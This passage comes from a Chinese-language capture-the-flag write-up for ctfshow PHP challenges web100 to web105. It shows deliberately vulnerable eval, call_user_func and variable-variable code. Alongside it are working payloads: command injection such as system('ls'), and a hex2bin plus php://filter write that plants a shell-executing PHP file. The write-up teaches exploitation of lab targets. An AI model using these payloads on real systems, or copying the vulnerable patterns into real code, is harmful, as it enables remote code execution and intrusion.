</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm">\# @Date:  2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm">\# @Last Modified by:  h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm">\# @Last Modified time: 2020-09-21 22:10:28
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">\# @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;ctfshow.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1">//flag in class ctfshow;
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1"></span><span class="nv">$ctfshow</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfshow</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$v1</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$v2</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nv">$v3</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="nv">$v0</span><span class="o">=</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v3</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$v0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;/&#34;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;/&#34;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">      <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$v2</span><span class="s2">(&#39;ctfshow&#39;)</span><span class="si">$v3</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">  
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl">
</span></span><span class="line"><span class="ln">31</span><span class="cl">
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题其实就是一道简单的拼接题</p>
<pre tabindex="0"><code>$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
</code></pre><p>这里看起来像是要求v1，v2，v3都为数字，实际上只需v1为数字则会将v1赋给v0，而不会再执行后面的语句</p>
<p>所以我们这里只需要使v1为数字即可</p>
<p>payload:</p>
<pre tabindex="0"><code>?v1=21&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;
</code></pre><p>或者用命令</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cobol" data-lang="cobol"><span class="line"><span class="ln">1</span><span class="cl"><span class="c">?v1=1&amp;</span><span class="nv">v2</span><span class="o">=</span><span class="nv">system</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span><span class="o">/*</span><span class="p">&amp;</span><span class="nv">v3</span><span class="o">=*/</span><span class="p">;</span><span class="err">
</span></span></span></code></pre></div><p><img alt="image-20241202145637866" loading="lazy" src="assets/image-20241202145637866.png"></p>
<p>将0x2d更换成-得到flag</p>
<h4 id="web101">web101<a hidden class="anchor" aria-hidden="true" href="#web101">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-22 00:26:48
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;ctfshow.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1">//flag in class ctfshow;
</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="c1"></span><span class="nv">$ctfshow</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfshow</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$v1</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$v2</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nv">$v3</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="nv">$v0</span><span class="o">=</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v3</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$v0</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\;|\?|[0-9]/&#34;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="se">\\\\</span><span class="s2">|\/|\~|\`|\!|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|</span><span class="se">\&#34;</span><span class="s2">|\&#39;|\,|\.|\?|[0-9]/&#34;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$v2</span><span class="s2">(&#39;ctfshow&#39;)</span><span class="si">$v3</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>题目描述:修补100题非预期,替换0x2d</p>
<p>修补了上一题通过直接命令执行或者var_dump打印类的方法</p>
<p>我们可以尝试使用反射类的方法，利用题目给出的<code>('ctfshow')</code>来拼接打印类</p>
<p>payload:</p>
<pre tabindex="0"><code>?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;
</code></pre><p><img alt="image-20241202152406295" loading="lazy" src="assets/image-20241202152406295.png"></p>
<p>这道题的flag少了一位，在得到的flag在替换掉0x2d后，再进行爆破即可得到flag</p>
<p>payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">a</span> <span class="o">=</span> <span class="s2">&#34;fa2a169a0x2da0820x2d40f30x2da5cd0x2d65ce0d29b42&#34;</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">b</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;0x2d&#34;</span><span class="p">,</span><span class="s2">&#34;-&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nb">hex</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="s2">&#34;2&#34;</span><span class="p">,</span><span class="s2">&#34;3&#34;</span><span class="p">,</span><span class="s2">&#34;4&#34;</span><span class="p">,</span><span class="s2">&#34;5&#34;</span><span class="p">,</span><span class="s2">&#34;6&#34;</span><span class="p">,</span><span class="s2">&#34;7&#34;</span><span class="p">,</span><span class="s2">&#34;8&#34;</span><span class="p">,</span><span class="s2">&#34;9&#34;</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">,</span><span class="s2">&#34;b&#34;</span><span class="p">,</span><span class="s2">&#34;c&#34;</span><span class="p">,</span><span class="s2">&#34;d&#34;</span><span class="p">,</span><span class="s2">&#34;e&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">hex</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ctfshow{&#34;</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">i</span><span class="o">+</span><span class="s2">&#34;}&#34;</span><span class="p">)</span>
</span></span></code></pre></div><h4 id="web102">web102<a hidden class="anchor" aria-hidden="true" href="#web102">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: atao
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-23 20:59:43
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$v3</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$v4</span> <span class="o">=</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v3</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$v4</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nv">$s</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$v2</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$str</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$v1</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">echo</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$v3</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl">
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>分析一下这段代码</p>
<p>首先这段代码会接收三个参数v1,v2,v3</p>
<p>根据php的特性，当$v2为数字时$v4就会被赋值为1，而与$v3的值无关</p>
<p>所以想要进入判断，我们首先要使v2为数字</p>
<p>接着会通过substr对v2前两段进行截断并赋值给s</p>
<p>下一步就会将v1和s都传入call_user_func函数</p>
<p><strong>call_user_func函数有什么用呢?</strong></p>
<p><code>call_user_func</code> 是 PHP 中的一个内置函数，它的主要作用是调用回调函数。</p>
<pre tabindex="0"><code>function greet($name) {
    return &#34;Hello, $name!&#34;;
}

$message = call_user_func(&#39;greet&#39;, &#39;John&#39;);
echo $message; 
</code></pre><p>我们先不管他怎么利用，接着往下看</p>
<p>最后会调用file_put_contents函数，那思路就很明显了，我们通过写文件来拿到flag</p>
<p>但是我们要将v2这一串数字经过一系列转换后写入文件并执行要怎么做呢？</p>
<p>假如说我们可以将php代码转换成base64后再转换成hex，而得到的hex又刚好为数字，那我们就能实现我们的目标。</p>
<p><strong>那怎么进行格式转换呢?</strong></p>
<p>我们可以通过call_user_func函数调用php的内置类hex2bin，将我们传入的v2转换回base64编码，接着在写文件的时候，再通过php伪协议的方式将base64先转换为我们的代码再写入文件。</p>
<p>经过尝试我们可以得到符合条件的代码</p>
<pre tabindex="0"><code>&lt;?=`cat *`;
base64:PD89YGNhdCAqYDs= (转hex去掉=)
hex:5044383959474E6864434171594473
</code></pre><p>我们需要在hex前面随便加两位数字来绕过截断</p>
<p>payload:</p>
<pre tabindex="0"><code>v1=hex2bin
v2=665044383959474E6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php
</code></pre><h4 id="web103">web103<a hidden class="anchor" aria-hidden="true" href="#web103">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: atao
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-23 21:03:24
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$v3</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="nv">$v4</span> <span class="o">=</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v3</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$v4</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nv">$s</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$v2</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nv">$str</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$v1</span><span class="p">,</span><span class="nv">$s</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">echo</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/.*p.*h.*p.*/i&#34;</span><span class="p">,</span><span class="nv">$str</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$v3</span><span class="p">,</span><span class="nv">$str</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Sorry&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;hacker&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题相比上一题多了一个过滤</p>
<pre tabindex="0"><code>if(!preg_match(&#34;/.*p.*h.*p.*/i&#34;,$str)){
        file_put_contents($v3,$str);
    }
    else{
        die(&#39;Sorry&#39;);
    }
</code></pre><p>继续用上题的方法即可</p>
<p>payload:</p>
<pre tabindex="0"><code>v1=hex2bin
v2=665044383959474E6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php
</code></pre><h4 id="web104">web104<a hidden class="anchor" aria-hidden="true" href="#web104">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: atao
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-28 22:27:20
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span><span class="o">==</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>使v1=v2即可</p>
<pre tabindex="0"><code>v1=1
v2=1
</code></pre><h4 id="web105">web105<a hidden class="anchor" aria-hidden="true" href="#web105">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-28 22:34:07
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$error</span><span class="o">=</span><span class="s1">&#39;你还想要flag嘛？&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nv">$suces</span><span class="o">=</span><span class="s1">&#39;既然你想要那给你吧！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$key</span><span class="o">===</span><span class="s1">&#39;error&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;what are you doing?!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nv">$$key</span><span class="o">=</span><span class="nv">$$value</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span><span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$value</span><span class="o">===</span><span class="s1">&#39;flag&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;what are you doing?!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="nv">$$key</span><span class="o">=</span><span class="nv">$$value</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$flag</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nv">$error</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="p">}</span>
